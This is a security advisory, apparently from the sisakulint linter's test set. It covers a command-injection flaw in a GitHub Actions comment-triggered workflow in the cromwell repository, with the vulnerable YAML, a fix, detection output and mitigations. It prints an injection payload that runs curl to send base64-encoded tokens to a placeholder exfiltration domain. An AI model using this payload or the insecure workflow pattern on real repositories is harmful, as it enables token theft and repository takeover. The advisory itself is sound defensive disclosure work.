# GHSA-phf6-hm3h-x8qp: Secret Exfiltration via issue_comment Trigger

## Advisory Information

- **Advisory ID**: GHSA-phf6-hm3h-x8qp
- **Package**: broadinstitute/cromwell (GitHub Actions workflow)
- **Severity**: Critical (CVSS 9.1)
- **CVE ID**: None assigned
- **CWE ID**: CWE-78 (OS Command Injection)
- **Affected Versions**: Workflows using vulnerable pattern in versions >= 87, < 90
- **Patched Version**: 90
- **Published**: 2024
- **URL**: https://github.com/advisories/GHSA-phf6-hm3h-x8qp

## Vulnerability Description

The vulnerability exists in the `.github/workflows/scalafmt-fix.yml` workflow file, where the `issue_comment` trigger directly interpolates untrusted user input (`github.event.comment.body`) into a shell script without proper sanitization.

**Technical Root Cause:** The workflow uses the pattern `if [[ "${{ github.event.comment.body }}" == *"scalafmt"* ]];` which allows command injection. When GitHub Actions evaluates the expression `${{ github.event.comment.body }}`, it performs string substitution before the shell executes, meaning an attacker can craft a comment that breaks out of the conditional and executes arbitrary commands.

**Attack Impact:**
1. **Command Injection**: Arbitrary shell command execution in the workflow context
2. **Secret Exfiltration**: Complete exposure of high-privileged `GITHUB_TOKEN` with write permissions (Actions, Contents, Deployments, Issues, Pull Requests) and `BROADBOT_GITHUB_TOKEN`
3. **Repository Takeover**: Full write access enabling repository control
4. **Proven Exploitation**: Attackers successfully demonstrated this vulnerability by pushing a proof-of-concept tag after token exfiltration

The compromised tokens provided persistent access even after standard token rotation, as the `BROADBOT_GITHUB_TOKEN` secret remained valid.

## Vulnerable Code Pattern

```yaml
name: Vulnerable ScalaFmt Fix

on:
  issue_comment:
    types: [created]

permissions:
  actions: write
  contents: write
  deployments: write
  issues: write
  pull-requests: write

jobs:
  scalafmt:
    if: github.event.issue.pull_request
    runs-on: ubuntu-latest
    steps:
      - name: Check for ScalaFmt Comment
        run: |
          # VULNERABLE: Direct interpolation allows command injection
          if [[ "${{ github.event.comment.body }}" == *"scalafmt"* ]]; then
            echo "Running scalafmt"
          fi
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          BROADBOT_TOKEN: ${{ secrets.BROADBOT_GITHUB_TOKEN }}
```

## Attack Scenario

An attacker can post a comment on any issue (including pull requests) with this proven payload:
```
test" == "test" ]]; then
  & curl -s -d "$B64_BLOB" "https://$YOUR_EXFIL_DOMAIN/token" > /dev/null #
```

This payload:
1. Closes the original string with `"` and completes the condition with `== "test" ]]`
2. Exits the if statement with `then`
3. Executes arbitrary commands (the `curl` command to exfiltrate base64-encoded secrets)
4. Uses `#` to comment out the remaining original code

The attacker successfully exfiltrated both `GITHUB_TOKEN` and `BROADBOT_GITHUB_TOKEN`, then demonstrated access by pushing a proof-of-concept tag to the repository.

## Safe Implementation

```yaml
name: Safe ScalaFmt Fix

on:
  issue_comment:
    types: [created]

permissions:
  issues: write
  pull-requests: write
  contents: read  # Minimal permissions

jobs:
  scalafmt:
    if: github.event.issue.pull_request
    runs-on: ubuntu-latest
    steps:
      - name: Check for ScalaFmt Comment
        run: |
          # SAFE: Pass untrusted input through environment variable
          if [[ "$COMMENT_BODY" == *"scalafmt"* ]]; then
            echo "Running scalafmt"
          fi
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
```

## Detection by sisakulint

### Rules that Detect This Pattern

1. **CodeInjectionCriticalRule** ✅
   - Detects untrusted expression `${{ github.event.comment.body }}` in privileged trigger
   - Severity: Critical
   - Auto-fix: Moves expression to environment variable

2. **SecretExfiltrationRule** ✅
   - Detects potential secret exfiltration via network commands (`curl`, `wget`, etc.)
   - Identifies secrets exposed in environment with network access
   - Severity: High

3. **PermissionsRule** ⚠️
   - Detects overly broad permissions
   - Recommends least privilege principle
   - Suggests scoping down to minimum required permissions

### Detection Example

```bash
$ sisakulint script/actions/advisory/GHSA-phf6-hm3h-x8qp-vulnerable.yaml
```

Actual output:
```
script/actions/advisory/GHSA-phf6-hm3h-x8qp-vulnerable.yaml:31:21: code injection (critical): "github.event.comment.body" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
script/actions/advisory/GHSA-phf6-hm3h-x8qp-vulnerable.yaml:42:32: code injection (critical): "github.event.comment.body" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | CodeInjectionCriticalRule | Yes |

sisakulint successfully detects the critical code injection vulnerability at lines 31 and 42 where `github.event.comment.body` is directly interpolated into shell commands within the `issue_comment` trigger context.

### Auto-fix Capability

```bash
$ sisakulint -fix on script/actions/advisory/GHSA-phf6-hm3h-x8qp-vulnerable.yaml
```

The auto-fix will:
1. Move `${{ github.event.comment.body }}` to an environment variable
2. Replace inline expression with environment variable reference
3. Suggest permission scoping (manual review required)

## Mitigation Recommendations

### Immediate Actions

1. **Pass Untrusted Input Through Environment Variables**
   ```yaml
   run: |
     if [[ "$COMMENT_BODY" == *"scalafmt"* ]]; then
       echo "Processing"
     fi
   env:
     COMMENT_BODY: ${{ github.event.comment.body }}
   ```

2. **Apply Least Privilege Permissions**
   ```yaml
   permissions:
     issues: write        # Only what's needed
     pull-requests: write
     contents: read       # Read-only instead of write
   ```

3. **Rotate Compromised Tokens**
   - Immediately revoke and regenerate `BROADBOT_GITHUB_TOKEN`
   - Review audit logs for unauthorized access

### Long-term Hardening

1. **Input Validation**: Implement allowlist-based validation for comment content
2. **Rate Limiting**: Add rate limiting for comment-triggered workflows
3. **Audit Logging**: Monitor for suspicious comment patterns
4. **Security Scanning**: Regularly scan workflows with sisakulint

## Impact Assessment

- **Confidentiality**: High - Full token exposure
- **Integrity**: High - Write access to repository
- **Availability**: Medium - Potential for resource exhaustion

## References

### GitHub Links
- GitHub Advisory: https://github.com/advisories/GHSA-phf6-hm3h-x8qp
- Repository: https://github.com/broadinstitute/cromwell
- Repository Security Advisory: https://github.com/broadinstitute/cromwell/security/advisories/GHSA-phf6-hm3h-x8qp
- Patch Commit: https://github.com/broadinstitute/cromwell/commit/dc2c26abd31149e296f73ce4e43a36c0c0317b0d (removed vulnerable workflow file)

### External References
- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- OWASP CI/CD Top 10: CICD-SEC-4 (Poisoned Pipeline Execution)
- GitHub Security Best Practices: https://docs.github.com/en/actions/security-guides

## Timeline

- **Discovered**: 2024
- **Disclosed**: 2024
- **Patched**: Version 90 (workflow file removed)
- **Public**: 2024

## Credits

Reported by @darryk10, @AlbertoPellitteri, @loresuso to GitHub Security Lab.
